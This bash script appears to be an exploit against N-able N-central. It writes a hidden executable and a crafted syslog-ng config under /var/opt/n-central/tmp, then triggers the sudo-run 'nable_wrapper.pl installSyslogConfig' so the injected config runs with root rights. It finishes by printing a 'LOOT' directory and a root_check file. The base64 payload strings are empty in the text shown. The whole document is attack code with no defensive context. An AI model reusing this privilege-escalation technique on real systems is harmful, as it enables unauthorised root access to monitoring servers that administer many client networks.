#!/bin/bash
mkdir -p /var/opt/n-central/tmp/syslog; cp -a /etc/syslog-ng/conf.d/ca.pem /var/opt/n-central/tmp/syslog/ 2>/dev/null; printf '%s' '' | base64 -d > /var/opt/n-central/tmp/.rc9234; chmod 755 /var/opt/n-central/tmp/.rc9234; printf '%s' '' | base64 -d > /var/opt/n-central/tmp/syslog/ncod_network.conf; echo TRIG_ST
sudo -n /opt/nable/usr/sbin/nable_wrapper.pl installSyslogConfig 2>&1; echo "RC=$?"; sleep 2; ls -la /etc/syslog-ng/conf.d/; echo TRIGGER >> /var/opt/n-central/tmp/nctrig9234.log; sleep 5; echo "=== LOOT ==="; ls -la /var/opt/n-central/tmp/loot9234/ 2>&1; cat /var/opt/n-central/tmp/loot9234/root_check.txt 2>&1
